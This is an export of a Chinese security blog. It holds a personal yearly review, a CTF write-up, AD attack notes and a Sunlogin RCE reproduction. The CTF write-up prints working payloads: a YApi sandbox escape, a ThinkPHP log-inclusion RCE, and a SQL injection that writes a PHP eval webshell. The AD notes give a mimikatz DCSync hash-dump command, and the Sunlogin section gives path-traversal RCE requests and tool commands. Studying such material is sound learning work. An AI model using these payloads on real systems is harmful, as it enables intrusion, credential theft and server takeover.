  <script id="hbeData" type="hbeData" data-hmacdigest="fb019f63dea109d9fadf7d96232539285e089d151e19e57b624edd6fae8266cd">792211fae0f67a76b537e59fee9c2dab1daa41aa57e19023a9c46972eb7bec605162ac581642f42cb4fadcc908a6dcde966bb263ff9e23df3f37df013b613928a7c1f47986677b593afe1b1a12d171a6d217ba32affbb538d4b2e67a151ad2bcccf594e20f357d8af32445734a5de93275111a1849d1c6380ef7d3613509899e824e57f6402d9157d86339bf1c35fdd7d02152385c75a2b2dec5eca877221e9c03761fa9ae1d2076e657c2a49c69fc366e3f62f82c6cc095fd85ae3bfff90b077afe6f509ddf69b197d6acae3800fa4a4e73fa9bac4ad7c1c3eeaaa8f77bda019bee75d5b69a1f069d6442ecf0dedf64db33e7236cf4d2cd6d397131af4d0cb0673cddbe4f595ad75cac0067b6fa4ea1360eca1aa14259fc35ead18a4793027578d34278cd4c27f452c9d544b19170655ae6347a2c07ec141a433b26efe327de9a6541243bf97697b8b72d69515da1adaa0c1a3fa65af922f057ef8c43222994aff1ec12c0c2925ed4e8052a97afdb1cd6c4a9b25b4d66bbbbc3522fe5ea883c0c88f02f92c5c4edd415dad8d1e80c1f18bb6e6636c48ef32799a8a86ae0a801805260d69876e7d3ffce4c5c46c24bb346ffbda7479f592024dfe1293f9c4082f2f2248a35fcebca655cd02b139254638ecc82e7db8d141a81ab470a9a2582ab1364be25f20f7c0414da5dda8cdced80add8fa4552c0cfcd38407c4af3dfecb2a6d9df32ab0cc3d3108450fb83d65389ec6460de72488b9de1e20192e34b9c2a19e367b361fab61ef52fc2f5d6f76f9906f656c6bd361108032a769a8cc8b5d37b5cdcd12d3bd0cfaa4c41d3b9cbb7ae54a6ad721f8d3640753eb5e417e623b671952005d5b13d8f4d2a8c96769270b18d45d7b050eff938243e1846a747137604277364f8f772c95a96e64493780477e33c4cb841c30e5252af1bf651618beef24ac574c7e9ada427e1c9ee9ad08fa57f940781aeae416fcf4aa2406714ccb6ec4b8c35cb36445859e1b77c1fdeb835a0290cc648197a34e777056ca03491095c5d2c0d114b65b126634bdda88fbaa2255992e959c0e23343fd64ee273d21802d89340d476b63b94a0a5074545fd345e71200f68014c949b8a78685c0c4dc4b9a9996d000c4c84c918b0f11beb34f6ad5dfebdd82d7bbac04dece7f4166ea8a3e2ec769c1807d8ac6f326826a79e81da695d9d644749a6f645860d6d0c0bf588723e2b8261d6143670775e814a2e6bdbe8b434d74fcb6758e7df3e6c1c7be41f9041c47ac47be258fafa6ac1cfc0b6b533da4bb12a3c6ad1384c0fb439428c19c6a1d823343b9b87bf3817da8b0c5b3c3f11bb60d79c0cb82738b89717147aebf8061593c7ca8fa1eea1e4382afb14cc54b5b7790ee38acb26b84998600b154f7ce16623494d6240eda8b79410eef31aa89dbe2a050637cbb624c81ac4f49e17f0fdcc49ba3b435a45e3f37b502ccde5a0141bbd1f1bd58ba25c94815eb37eb4c84dd3ff96ad1ca21a1fcd14f85c2c6a1fd021bfaf7d7806951e78a5ede641a9f758a8c65026b4f6f5847b55bf77bbc9a07ae2adc7d8c2bf2cdaa2db95a5433dd9cf2741bf2af8f2ccc193974f07b08a26654f3f4ae83bbd05f549183f9e861d56cb2388b353a35338ef5ff27acd444b18707a63047f94990cafe9d1c074f3e39fd4a801c3fbf22af821202af2d8d8e9d1832ee0bca257e38b574a5dd786220b4d05b47def8827c013a9d2d9feadac184cd5ff061e282e9bad3ec2f9fee25d23754a23aa0bc95ae6fd885777eeb8afb6df415e4235d6cf10dde4ccb2094cbfa4dd38087a36bbd5ca0c03387b4f08aea0ccdf9b0e6525f53c70de5a8d07989fdd083ef500a20564254c835fc32b80119cd1cdeb1ba17c87e719f219adf439286591f83ba7d06b5496900f10d17e94a57c3f46b7dd617e81a71eb5f41e5b5125772158d5fd1f4c4a90237aa343c203e19f32100e01994400f899abf54b3f020a5fc6f436ee503965b708cf3931dd1a76525f22a2775304d317ef022b457f9305997f8c78bc3cadf2024f067492113669798c60dbbde9ef5de588401fcef52bd4cf33e95bcc2c642bf45416f26b0c04ab90625472047e78672fee3c8a7bff2ca9897aabea89651fdb3e07a26ac89372885e1c87e2b1d4a30b198a7c2bd587cc3ee063b499cdeaa2efa47412213dd288bd776262363d8802db2108d8397df176d590dc449ea433a6d2790d854aedf0ca9e41d17c5f4a786bc9c93ddb96bbb1a2de0ad944ccf70b099bf02abadbf84e071f5418ccf2f7f25907e839eb3dbd5eb6cdb334f9e25f43bf4bc5974dd2974d3da11bd9b9c4917e579bf74380d19384bcca7b56abebd1c6808eb9c879920c462713bf73d9920944678da1c68332e009101c21cf4addf52e0cc873d88f86e4c6715b0c42d2d61c82500a6db101ab83f3640dab660bc8ef770fbca19b02758607e402d9f96c16910beb0a700279d4c385740caa3ebb39ec7cc248d2e6189c92575dc85ac658a81b45c4116500379fc91faf7bc08940d8b729864af184cfb08c0c6999b24d8a58290b4ce431acdb2a35b91153ab52408759c2b1b0726ebbedf2b293d90187bcecf4d9a3c477a7ab92fa622109ae064ad834b2a03b40c941e2bbdf859b79077c7aa654ecdc01e8153cd12fc617c04fb70a0eb2066ae937e2b57f4dc04e0ab298d37c88761fbc7350e14fe10f2aada11410211a7087955178465090f641683ea17884377427547665268357b390290d5524c0408cc24f5921c16cd6f6137f14304ea9380b66488dd2f806a3d2c54bffb6a29c9a3ca2360313219da1ffbdaee5de55e30678526e1383855cc6fc192e2a61f3b14bbfee4176cf90ada541676d5ab537b998eec2449feb0005a4c1a310746a76cae02eb28c41417c71d773010a929338efd6696816053062f6b999b4c50ead027ebbf7ef1e6a71b8abc855271f2c8e9077907c5e39a5068f4b697e073b0c1d0c727c6b616aac8034b1078ab78b4d032f22e59d4267c025ad5e7215e11a5f9909aed466b8b58d026f9a24be85668931f99537779044274828e0db16e229aa9f16a21bed219903e0b404b6368da9a5462bf8ba98dd4298fb8989bab9a51c0cc012964eaba6ad080c3b4c1b2f666261555cd073f7c88df3553c26a64cf273486923b6d5736b9744797c3ebe9c282875f6c3deb569684a9866439c1ba1f9b5c4e28fa81108246cadbc4fa25c90623e7c611caa166ccf06a6e8aeb8989a7a38961fcfe008413c785569010cd0976ce52710e22ba1423d8ca254d65321086b86f6415eaa0a98c3bc1a0f8e596223ff62a193541bc48cf5259cc15267f6bf704e00e0c06f81efa4ad1ad2a3e6e3a86f183fc798e0d69b20a9b51572cdce30d6fc546183e823a78f265ccf67b7dab53640fe28fef165f0c5f00bb9a55aee92d43941da5b4276cae27c210f54c7c04d86c989e3ad034774e4f92628384e99f7e5f6237bc6416f4cfc63e58668cc14f9440cd3db8a2dfcbd5a572cfc4f32d724640f3beaeb8043f28a5bae0b3c184995e032955eb3b70d1a7a54530467ae0e424be7fb724432ffaa2fe74095132bcb591952d1c5dfed4c6364facd3260da73f6f1f4195bb01d757553bdab14a3a2b1fdf369427e2288e3cac9e853d8856504cbd7092801fbfca57686bcc9f57717f871b07f6183a25b1ba9c97d807dc5c9ce3ec31832c8090424f4e78a3d67e69d89e70886d52d9480e0b3a83b8ad53d572ffd1a8099ac5834851da7b10c0bc7a0a4e7c29104b4cd352c85a76047aee59dc4189b9f2059472c84c4b14dc49074bbe0151a351c7d768ef4511fa9136335a1172429391aba5cae8b1135a26a95a608d59792fff5f09ed578daa9a5e8fba0bf12ceedc7bde0c81d37488ed3af0f2801dd507e52970d688ba0e40703ed64faa243f71b10f20b81df2ffbcfd7a06318d1ee87f77e2d1ec1dcff3661d51b06a581e02d429e5ee2ee43ac1effa2d485293759c4b0e2478188198110c0679454936696f9b842327d90c63787fc73d405a9e22b0e26767f5eb4c40208d0f259d1b43ad790a66484c37c26c71b2335ae6a35d6ed8afa90000a7277461729c4f8d39a4d81d400b79e491ac4f01bc94fcd966508dc53e6131500c905afa0d76e6369c2f63c9361db8610957a703554228ce13262ed6573010235d3a2501dec31741bf0f3be50ed49525362c7ff51457cc976958b604beaa777859f67a1796a71afa8f00aaf00c07e88f2e2f184128e29aec344119618b1f79f4574424a5b767ef7d9438858d03e443ae5955e8dbb3328eedd7842b52a48c570ddb5e4ac910454f8abe8165984cc96224e68d817f67ecbb896fb29dbff9fc5e06d7b5aa0a881e05ab2f315413a7a085e65cab0c322f3e71743eb2416c21667791bd6c495e2691218a6c86a7a9f6cc167774c960c7e971ee47fc09fbed9761115ff8eaaa42d0e206a5c9c3f78c11f1198502898724144a3b586d8383d3d5e9b6367f20a5768fd55fb6bd3cf02e203e2de2c0e3d4bd98a250c363017716f79f5662b8c004d33c4a7c61da6303291bfb9978c702653212a80ee4bf7528c981595a5092c17d8e449235dde47136f341889b6a53ffadd510bb24f027c9e731f29395b3a8b2b501a58354aa86e52da009e6f089b66ebf32fbc1269d65e101396195c4636b84176900251b125ee9927f9270</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我的qq</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>对2020年总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2021总结</title>
    <url>/2022/01/11/2021%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul>
<li><input checked disabled type="checkbox"> 她依然在</li>
<li><input checked disabled type="checkbox"> 暑假实习</li>
<li><input checked disabled type="checkbox"> 体验线下awd</li>
</ul>
<span id="more"></span>

<ul>
<li><input checked disabled type="checkbox"> 不挂科</li>
<li><input checked disabled type="checkbox"> 加入安全团队，其他师傅好强</li>
<li><input checked disabled type="checkbox"> 对内网有了深入认识和利用方式</li>
</ul>
<ul>
<li><input disabled type="checkbox"> 实战能力太差</li>
<li><input disabled type="checkbox"> 没有挖洞进展</li>
<li><input disabled type="checkbox"> 寒假实习</li>
</ul>
<h2 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h2><ul>
<li><p><input disabled type="checkbox">  运动，锻炼，看书，规律作息</p>
</li>
<li><p><input disabled type="checkbox">  寒假把内网在深入透彻</p>
</li>
<li><p><input disabled type="checkbox">  挖src，CNVD，java代码审计</p>
</li>
<li><p><input disabled type="checkbox">  去古檀，，，，一定一定要通过面试，短期梦想，加油</p>
</li>
</ul>
]]></content>
      <categories>
        <category>经历</category>
      </categories>
      <tags>
        <tag>对2021年总结</tag>
      </tags>
  </entry>
  <entry>
    <title>21DASCTFJuly</title>
    <url>/2021/08/01/21DASCTFJuly/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>您的排名：148      慢慢复现有时间</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183537143.png" alt="image-20210801183537143"></p>
<span id="more"></span>

<h4 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h4><p><img src="/2021/08/01/21DASCTFJuly/image-20210801180135739.png" alt="image-20210801180135739"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$cmd</span>))  &#123;    </span><br><span class="line">    <span class="variable">$cmd</span> = escapeshellarg(<span class="variable">$cmd</span>);    </span><br><span class="line">    system(<span class="string">&#x27;cat &#x27;</span> . <span class="variable">$cmd</span>);  &#125;&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;  highlight_file(<span class="keyword">__FILE__</span>);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180247394.png" alt="image-20210801180247394"></p>
<p>猜测命令执行查看历史命令文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure>

<p><code>escapeshellarg()</code>函数  把字符串转码为可以在 shell 命令里使用的参数，不会绕过。。。</p>
<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p>
<p>看过wp才知道要想读日志，nginx日志默认路径<code>/var/log/nginx/access.log</code></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123025756.png" alt="image-20210820123025756"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123606239.png" alt="image-20210820123606239"></p>
<p><code>escapeshellarg()</code>利用非ascii字符绕过，%aa,%ba,%fa</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125330839.png" alt="image-20210820125330839"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125339970.png" alt="image-20210820125339970"></p>
<h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p>
<p>注册，创建项目</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p>
<p>这里可以命令执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;command&quot;</span>).toString()</span><br></pre></td></tr></table></figure>



<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180857819.png" alt="image-20210801180857819"></p>
<p>保存后，添加接口</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801180938961.png" alt="image-20210801180938961"></p>
<p>访问接口</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181000869.png" alt="image-20210801181000869"></p>
<p>即可看到命令执行结果，直接命令执行得flag</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181010300.png" alt="image-20210801181010300"></p>
<p><a href="https://www.pwnwiki.org/index.php?title=Yapi_%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">参考：</a></p>
<h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h4><p>v3.2.3直接网上找rce</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801181452123.png" alt="image-20210801181452123"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;--&gt;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>要burp中 执行，url中执行不行</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182210100.png" alt="image-20210801182210100"></p>
<p>查看对应日志文件，注意日志时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php&#x2F;?m&#x3D;Home&amp;c&#x3D;Index&amp;a&#x3D;index&amp;value[_filename]&#x3D;.&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Common&#x2F;21_08_01.log</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182233463.png" alt="image-20210801182233463"></p>
<p>命令执行成功，</p>
<p>上马</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182553174.png" alt="image-20210801182553174"></p>
<p>蚁剑连接好像不太行，奇怪有时候可以</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801182808593.png" alt="image-20210801182808593"></p>
<p>找到flag</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p>
<p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p>
<h4 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h4><p>根据网上爆出了sql注入，在后台登陆处，</p>
<p>然后根据目录扫描<a href="http://www.zip/">www.zip</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f1_vvv  函数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析源码得到过滤了<code>空格</code>和<code>0x</code>，fl_value函数对一些关键词做了过滤，</p>
<p>判断5列</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912182056650.png" alt="image-20210912182056650"></p>
<p>但是后门写马时候也要注意部分关键字被replace为空格</p>
<p>后门马</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184824092.png" alt="image-20210912184824092"></p>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&amp;password&#x3D;dd&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;16&amp;submit.y&#x3D;29</span><br></pre></td></tr></table></figure>

<p>response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bad！hacker！&lt;br&gt;sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name&#x3D;&#39;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&#39; limit 0,1</span><br></pre></td></tr></table></figure>

<p>select，outfile要双写</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183311495.png" alt="image-20210912183311495">、</p>
<p>查看后门</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183414063.png" alt="image-20210912183414063"></p>
<p>命令执行</p>
<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184256103.png" alt="image-20210912184256103"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DASCTF July X CBCTF 4th</tag>
      </tags>
  </entry>
  <entry>
    <title>AD域的攻击方式</title>
    <url>/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><h3 id="本地组策略-LGP"><a href="#本地组策略-LGP" class="headerlink" title="本地组策略 LGP"></a>本地组策略 LGP</h3><p>简称（Local Group Policy或者Local GPO）</p>
<p>win+R键打开运行，输入“gpedit.msc”</p>
<p><img src="/2022/03/03/AD%E5%9F%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/image-20220303233218371.png" alt="image-20220303233218371"></p>
<p>添加对应脚本即可</p>
<p>或者将文件直接放入C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup   路径下  （可以开机自启）</p>
<p>通常用来权限维持</p>
<span id="more"></span>

<h3 id="域组策略"><a href="#域组策略" class="headerlink" title="域组策略"></a>域组策略</h3><p>域控机器下发一些策略，可以利用域组策略进行批量修改</p>
<h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是存储域公共文件服务器副本的共享的文件夹，存在域控制器(DC)的C:\Windows\SYSVOL下，用来为整个域中域控制器提供访问和复制的能力，里面保存了组策略相关的信息。     同时存放在Sysvol文件夹中的信息会复制到域中所有DC上。   在域中，用户登录时会先在sysvol下查找<strong>GPO</strong></p>
<p>目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain 文件夹：存储策略实体，策略和脚本存储位置</span><br><span class="line">Staging：交换区域，临时存放多台DC之间需要同步的数据，DC中的数据首先复制该文件夹，然后在DC之间相互复制</span><br></pre></td></tr></table></figure>



<h5 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h5><p><strong>netlogon</strong> 挂载点为 <code>SYSVOL\domain\SCRIPTS</code> ，存放脚本信息。</p>
<h5 id="GPO（Group-Policy-Object）"><a href="#GPO（Group-Policy-Object）" class="headerlink" title="GPO（Group Policy Object）"></a>GPO（Group Policy Object）</h5><p>组策略设置的集合，用GPO来存储不同的组策略信息。</p>
<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>即  组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理</p>
<p>Gpp 用来在下面场景存储和使用凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">映射驱动（Drives.xml）</span><br><span class="line">创建本地用户</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建&#x2F;更新服务（Services.xml）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line">更改本地Administrator密码</span><br></pre></td></tr></table></figure>























<p>参考：<a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></p>
<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>参考：<a href="https://www.freebuf.com/articles/system/198381.html">https://www.freebuf.com/articles/system/198381.html</a></p>
<h1 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h1><h1 id="打域控"><a href="#打域控" class="headerlink" title="打域控"></a>打域控</h1><h3 id="ZeroLogon-CVE-2020-1472"><a href="#ZeroLogon-CVE-2020-1472" class="headerlink" title="ZeroLogon(CVE-2020-1472)"></a>ZeroLogon(CVE-2020-1472)</h3><h3 id="CVE-2021-42287-and-CVE-2021-42278-只需一个域用户"><a href="#CVE-2021-42287-and-CVE-2021-42278-只需一个域用户" class="headerlink" title="(CVE-2021-42287 and CVE-2021-42278)只需一个域用户"></a>(CVE-2021-42287 and CVE-2021-42278)只需一个域用户</h3><h1 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h1><h3 id="导hash"><a href="#导hash" class="headerlink" title="导hash"></a>导hash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得以下任一用户的权限：</span><br><span class="line">Administrators组内的用户</span><br><span class="line">Domain Admins组内的用户</span><br><span class="line">Enterprise Admins组内的用户</span><br><span class="line">域控制器的计算机帐户</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:xxxx.org &#x2F;all &#x2F;csv&quot; exit</span><br></pre></td></tr></table></figure>





<h3 id="维权"><a href="#维权" class="headerlink" title="维权"></a>维权</h3>]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>AD域的攻击方式</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE复现</title>
    <url>/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="向日葵远程代码执行"><a href="#向日葵远程代码执行" class="headerlink" title="向日葵远程代码执行"></a>向日葵远程代码执行</h3><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p><strong>向日葵远程控制</strong>是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p>
<p>（CNVD-2022-10270/CNVD-2022-03672），影响Windows系统使用的个人版和简约版。 该漏洞发生在接口``/check`处，</p>
<p>此漏洞端口一般大于40000</p>
<span id="more"></span>

<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11.1.1</span><br><span class="line"></span><br><span class="line">10.3.0.27372</span><br><span class="line"></span><br><span class="line">11.0.0.33162      （不一定准确）</span><br></pre></td></tr></table></figure>



<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><blockquote>
<p>手工测试：</p>
</blockquote>
<p>首先我们要确定目标端口(扫描开放端口，一般在 40000以上)，然后访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225345974.png" alt="image-20220320225345974"></p>
<p>获取token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.102:49414&#x2F;cgi-bin&#x2F;rpc?action&#x3D;verify-haras</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225428763.png" alt="image-20220320225428763"></p>
<p>“verify_string” 的值会刷新改变，但这个下面我们和CID:组成cookie</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;check?cmd&#x3D;ping..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;ipconfig</span><br><span class="line"></span><br><span class="line">添加  Cookie: CID&#x3D;sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1</span><br></pre></td></tr></table></figure>



<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320230404045.png" alt="image-20220320230404045"></p>
<blockquote>
<p>脚本测试：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t scan</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320224603734.png" alt="image-20220320224603734"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xrkRce.exe -h 192.168.1.102 -t rce -p 49414 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CVE%E5%A4%8D%E7%8E%B0/image-20220320225054179.png" alt="image-20220320225054179"></p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/cn-gov/p/15952459.html">https://www.cnblogs.com/cn-gov/p/15952459.html</a></p>
<h3 id="CVE-2022-0543-Redis-Lua-沙箱绕过"><a href="#CVE-2022-0543-Redis-Lua-沙箱绕过" class="headerlink" title="CVE-2022-0543   Redis Lua 沙箱绕过"></a>CVE-2022-0543   Redis Lua 沙箱绕过</h3><p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA">https://mp.weixin.qq.com/s/Q3iRoVynpkUHUDo74UnXgA</a></p>
